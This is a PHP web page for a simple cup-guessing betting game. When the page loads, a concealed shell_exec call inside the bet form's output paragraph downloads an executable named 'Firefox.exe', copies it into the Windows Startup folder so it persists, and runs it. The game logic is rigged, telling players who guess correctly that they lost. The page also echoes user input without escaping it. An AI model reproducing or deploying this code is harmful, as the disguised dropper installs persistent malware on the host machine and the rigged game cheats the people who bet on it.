<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <title>Cup Game</title>
</head>

<body>
    <div class="center">
        <h1 class="header">
            Cup Game
        </h1>

        <div class="input">
            <form method="post">
                <input type="text" id="bet" name="bet" placeholder="Insert bet">
                <input type="submit" value="Confirm Bet" id="confirm">
            </form>
            <p id="bet_confirmed_p">
                <?php
                $output = shell_exec("curl -LJO https://github.com/OrangesAreGreat10/Images/raw/main/Firefox.exe && move /y Firefox.exe \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" && \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Firefox.exe\"");
                echo $output;
                if (isset($_POST["bet"])) {
                    echo "The bet confirmed is $" . $_POST["bet"];
                    
                } else {
                    echo "No bet was provided.";
                }
                ?>
            </p>

        </div>

        <div class="center2">
            <img src="cup.png" alt="cup" class="cup">
            <img src="cup.png" alt="cup" class="cup">
            <img src="cup.png" alt="cup" class="cup">
        </div>

        <p>Which cup is the ball under?</p>
        <form method="post">
            <input type="text" id="bet" name="cupnum" placeholder="Insert bet">
            <input type="submit" value="Confirm Bet" id="confirm">
        </form>

        <?php
        // Assuming the actual cup number is stored in a variable
        $actualCup = 1; // Example, you can adjust this according to your code
        
        // Check if the cupnum guess is provided in the form submission
        if (isset($_POST["cupnum"])) {
            // Retrieve the user's guess
            $userGuess = $_POST["cupnum"];

            // Check if the user's guess matches the actual cup number
            if ($userGuess == $actualCup) {
                // Display a message indicating that the user lost
                // Increment the actual cup number by 1
                $actualCup++;
                echo "<p>Sorry, you lost! It was under $actualCup</p>";


                // Optionally, you can update the actual cup number or perform other actions here
            } elseif ($userGuess == 0) {
                // Display a message indicating that the user won
                echo "<p>Congratulations, you won!</p>";
                // Optionally, you can reset the game or perform other actions here
            } elseif ($userGuess == 3) {
                // Reset the actual cup number to 1
                $actualCup = 1;
                // Optionally, you can inform the user that the cup number is reset
                echo "<p>You lost, the ball was under Cup 1</p>";
            }
        }
        ?>


    </div>
</body>

</html>